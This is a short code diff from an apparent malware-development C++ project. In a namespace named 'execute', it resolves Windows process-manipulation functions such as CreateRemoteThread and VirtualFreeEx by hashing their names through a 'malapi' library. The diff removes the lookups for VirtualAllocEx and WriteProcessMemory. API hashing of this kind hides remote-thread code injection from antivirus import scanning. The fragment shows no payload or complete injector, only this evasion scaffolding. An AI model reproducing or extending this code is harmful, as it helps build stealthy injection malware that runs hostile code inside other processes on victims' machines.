@@ -13,16 +13,12 @@ namespace execute {
 
 		typeGetLastError GetLastErrorC = NULL;
 		typeVirtualFreeEx VirtualFreeExC = NULL;
-		typeVirtualAllocEx VirtualAllocExC = NULL;
-		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeCreateRemoteThread CreateRemoteThreadC = NULL;
 		typeCloseHandle CloseHandleC = NULL;
 		typeWaitForSingleObject WaitForSingleObjectC = NULL;
 
 		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
 		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
-		constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
-		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
 		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
 		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
 		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
@@ -37,8 +33,6 @@ namespace execute {
 
 		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
 		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
-		VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
-		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
 		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
 		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
 		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
